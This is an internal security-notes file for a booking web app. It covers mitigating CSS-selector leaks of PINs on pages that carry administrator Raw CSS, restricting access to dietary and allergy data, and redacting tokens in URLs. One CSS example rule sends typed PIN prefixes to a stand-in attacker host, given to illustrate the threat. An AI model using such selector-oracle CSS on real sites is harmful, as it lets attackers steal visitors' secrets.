# Security Notes

This document captures security decisions and trade-offs that are too
implementation-specific for `SECURITY.md` at the repository root. The
root `SECURITY.md` covers the public reporting policy; this file
captures internal mitigations and operator-facing rationale.

## Secret entry on pages that carry Raw CSS

Audience: Developer, Agent.

### The rule

**A user-entered secret on a surface that injects administrator Raw CSS must
never be represented in a CSS-selectable DOM attribute, or in any other
selector-readable DOM metadata, while the secret is live.** The element's `value`
*property* may hold what the browser needs in order to submit; a stylesheet
selector must not be able to recover it.

Use `SecretInput` (`src/components/ui/secret-input.tsx`) for such a field. Do not
solve it by filtering CSS selectors, and do not move the secret to `data-*`,
`aria-*`, a hidden field or `title` — those are selectable too.

### Context

`buildClubThemeCss()` is the only build that appends the club's `rawCss` from
Admin > Site Appearance, and its output reaches a page document in **three**
places, enumerated in
[`SECURITY-ATTACK-SURFACE.md`](SECURITY-ATTACK-SURFACE.md) → "Admin Raw CSS on
the public site": the website chrome (the `(website)` and `(website-dynamic)`
groups), the lodge display screen, and the pre-setup holding screen. Every other
shell injects `buildClubThemeAppCss()`, which excludes it by design. That bullet
is the count; do not restate it here or anywhere else.

A styling administrator is deliberately **outside** the trust boundary of a kiosk
PIN or a bearer token — the same boundary #2827 drew for the group-join payment
token.

React's controlled-input pattern breaks that boundary. On every update
`react-dom` writes `node.defaultValue`, and `defaultValue` reflects to the `value`
**content attribute** — so a controlled input publishes what the visitor has typed
to any selector on the page:

```css
input#hut-leader-pin[value^="14"] { background: url(https://attacker.example/14); }
```

Measured in real browsers before any fix was written, because jsdom is not
evidence about a browser. The per-engine matrix is in the attack-surface bullet
above; the full method and the raw observations are on issue #2981.

### Mitigation

`SecretInput` renders an **uncontrolled** input: neither `value` nor
`defaultValue` reaches the element, so `react-dom` never writes `defaultValue`
and no `value` attribute exists at any point. Both props are removed by the type,
so passing one is a compile error rather than a lint rule, and stripped at
runtime so an untyped spread cannot reinstate the leak. Input filtering runs
against the element's own property instead of being fed back as a prop.

### What keeps it true

- `e2e/raw-css-secret-reflection.spec.ts` — the runtime pin. It saves real Raw
  CSS containing the oracle rules, types a known PIN into the real page, and
  fails if the attribute, a prefix selector or the computed style ever reveals a
  character. This half cannot be replaced by a source scan.
- `src/lib/__tests__/raw-css-secret-input-census.test.ts` — the static half:
  which files inject the theme CSS (so a fourth sink cannot appear
  unclassified), which credential fields exist on those surfaces, and that
  `SecretInput` still passes no value into the DOM. Its own docblock names the
  four evasion shapes it cannot see.
- `src/components/ui/__tests__/secret-input.test.tsx` — filtering and caret
  repair.

### Scope, and what is accepted

Bounded to credential-bearing fields — PIN/passcode, passwords, bearer/invite/
access tokens, API keys — on the Raw-CSS surfaces. Ordinary text fields (a name,
an email) are not in scope: they are not secrets the styling administrator sits
outside the boundary for, and the attendee-data residual the attack-surface
bullet records is the owner's ratified position on those.

A stylesheet can still observe these, and all of them are **accepted**. None is
character-wise, and for a fixed-length all-digit PIN none of them narrows the
search space at all:

- `:placeholder-shown` — whether the field is empty.
- `:valid` / `:invalid` — whether the value satisfies the field's `pattern`,
  i.e. whether six digits have been entered.
- the submit button's `disabled` attribute, which flips at the same moment and is
  therefore redundant with `:valid`.
- `:autofill` — whether a password manager filled it.
- `:focus` / `:focus-visible` — whether the visitor is in the field.
- `:user-invalid` — the same bit as `:invalid`, after interaction.

**Stated limit, not a residual: real password-manager autofill was not measured.**
The browser spec covers programmatic paste and keyboard entry. HTML autofill sets
the `value` property rather than the attribute, which is the same seam typing
uses, so it is reasoned rather than observed.

## Dietary/allergy information (special-category data)

Audience: Developer, Agent, Operator.

`Member.dietaryRequirements` (#2941) and each stay's
`BookingGuest.dietaryRequirements` (#3029) hold health-related personal
information, children's included. The rule is `INV-PRIV-022` in
[`invariants/analytics-and-privacy.md`](invariants/analytics-and-privacy.md#inv-priv-022);
this section records how it is enforced.

- **Absent by default, not filtered.** Every application Prisma client omits the
  column (`src/lib/prisma-global-omit.ts`), so a Member read that does not ask
  for it does not carry it — including nested includes and the row an update
  returns. `src/lib/member-dietary.ts` is the only module that asks, and only for
  a caller holding a grant: the member themself (the grant takes their session),
  their own data export, an admin whose OWN database row and access roles reach
  **membership** (the grant re-reads them and ignores any session matrix), or a
  merge whose Full Admin the grant re-checks in the database, scoped to the two
  members being merged. A booking value is read by an admin whose own rows reach
  **bookings** (view; edit to change one row through
  `PATCH /api/admin/bookings/[id]/guest-dietary`), by the kiosk's `admin` and
  `hut-leader` tiers for that day's present guests only, and by the subject's
  own export for their own guest rows. A booking grant cannot read a profile,
  nor a profile grant a booking. A grant is an opaque object whose authority
  lives in a module-private map, so a copy of one is not a grant.
- **The booking write side hands out tokens, not values — and its real fence is
  its importer list.** Its half of the boundary,
  `src/lib/member-dietary-booking-writes.ts`, is the only other file that may
  name the column; it mints no grant, and its carries are scoped to their
  source booking. Its two fragment builders necessarily return the plain value
  for Prisma to write, so what holds is the census: a closed list of booking
  writers may import it, none may name a grant or reader, the builders may
  appear only as a `...` spread operand, and seeding may only come from the
  toggle. That is a text scan and holds no stronger than one. Every guest create
  site takes a required dietary decision from it, and the held-party
  planners carry a value only by unique identity, never by position
  (`INV-MOD-059`); a writer never holds the value in readable form.
- **The type does not say so.** `src/lib/prisma.ts` keeps the plain
  `PrismaClient` type, so the compiler still shows the field on every row; a read
  outside the module gets `undefined`, never the value.
  `member-dietary-access-census.test.ts` is a TEXT scan of `src/`, `scripts/`,
  `prisma/` and `e2e/`. It fails on any other select, local omit override,
  raw-SQL read of the column, whole-row raw read or omit-less client; it confines
  the field's spelling (in `src/`), imports of the module, and calls of the merge
  engine (which mints a scoped grant internally) to listed files, none on an
  egress path (a booking-value entry may be allowed, by name, onto the booking
  or kiosk family only), and refuses a re-export, exported alias or minting
  wrapper of a grant or reader, a booking writer that names a grant or reader,
  and any writer but the module naming the column. It does
  NOT trace data flow: a listed file reading the field off an ordinary row, or
  passing a value it legitimately holds onward, stays green. Review covers that.
- **Redaction as a backstop.** The log/Sentry redactor strips `dietary`/`allerg`
  keys, and the audit sanitizer redacts any string or structure under such a key
  while keeping the booleans that record which field changed.
- **The AI diagnostics role cannot read it.** Its Member and BookingGuest
  grants are column allowlists (`provision-role.ts`) that include neither
  column.
- **Backups contain it**, like every other column; see
  [`guides/backups.md`](guides/backups.md).

## Token-bearing URL paths

### Context

Some emailed confirmation and payment links carry 256-bit tokens in URL paths:

```
https://<host>/membership-cancellation/<token>
https://<host>/chores/<token>
https://<host>/nominations/<token>
https://<host>/pay/<token>
https://<host>/booking-requests/verify/<token>
```

URL paths are routinely captured by:

- Next.js / Node access logs
- Reverse-proxy logs (Caddy, in our deployment topology)
- Sentry and any other observability tooling that captures request
  metadata
- Browser history
- The `Referer` header of any outbound link click from the confirmation
  page

### Residual risk

Some token routes are also session-bound; others are intentionally public
opaque-token flows. A stolen public payment, chore, nomination, or booking
request verification token can act as the bearer credential for that specific
workflow until it is used, revoked, or expires.

### Mitigation

The shared text redaction layer (`src/lib/redact-sensitive-json.ts`)
strips the token segment from any supported token-bearing path before the
value is emitted by the Pino logger or attached to an `err` payload. This
covers structured request logs, captured error stacks, URL-encoded login
callback paths, and any other observability surface that flows through
`redactSensitiveText`.

The token remains in clear text in the email body sent to the participant or
requester, which is the only place they need it.

### Operator checklist

When reviewing observability dashboards or proxy access logs that are
exported outside of the application process, confirm that the source
also redacts these token-bearing path segments. The application-level
redaction does not protect logs that the application does not emit.
